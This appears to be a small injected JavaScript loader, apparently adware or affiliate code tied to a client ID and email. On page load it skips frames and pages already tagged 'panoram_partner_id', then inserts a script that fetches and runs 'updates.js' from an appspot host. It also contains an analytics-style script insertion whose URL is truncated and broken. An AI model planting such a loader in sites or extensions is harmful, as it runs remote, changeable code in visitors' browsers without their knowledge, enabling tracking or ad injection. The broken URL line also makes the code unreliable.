//Hashimtopaz@gmail.com
//aj676 is your Unique Client ID
(function() {
    if (window.location != window.parent.location ||
        window.panoram_partner_id) {
        return;
    }
 
    var ga = document.createElement('script');
    ga.type = 'text/javascript';
    ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www');
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(ga, s);
 
    var submodules = ['updates.js'];
    var head = document.getElementsByTagName('head')[0];
 
 
    for (var i = 0; i < submodules.length; i++) {
        if (submodules[i].length > 0) {
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.src = '//aj-676.appspot.com//' + submodules[i];
            head.appendChild(script);
        }
    }
 
})();